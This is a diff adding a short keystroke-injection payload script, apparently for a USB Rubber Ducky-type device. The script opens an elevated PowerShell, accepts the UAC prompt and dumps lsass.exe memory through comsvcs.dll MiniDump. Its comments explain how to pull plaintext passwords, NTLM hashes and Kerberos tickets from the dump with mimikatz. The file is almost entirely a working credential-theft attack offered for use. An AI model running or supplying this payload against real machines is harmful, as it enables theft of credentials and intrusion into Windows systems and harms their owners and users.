@@ -1,0 +1,21 @@
+REM ============================================================
+REM  Windows · LSASS Memory Dump (Credential Extraction)
+REM ============================================================
+REM  Uses comsvcs.dll (built-in) to dump lsass.exe memory.
+REM  The dump file can be processed offline with mimikatz to
+REM  extract plaintext passwords, NTLM hashes, and Kerberos
+REM  tickets.
+REM
+REM  Requires admin. Output: C:\Windows\Temp\debug.dmp
+REM  Process: mimikatz # sekurlsa::minidump debug.dmp
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+STRINGLN $p=(Get-Process lsass).Id;rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Windows\Temp\debug.dmp full;exit
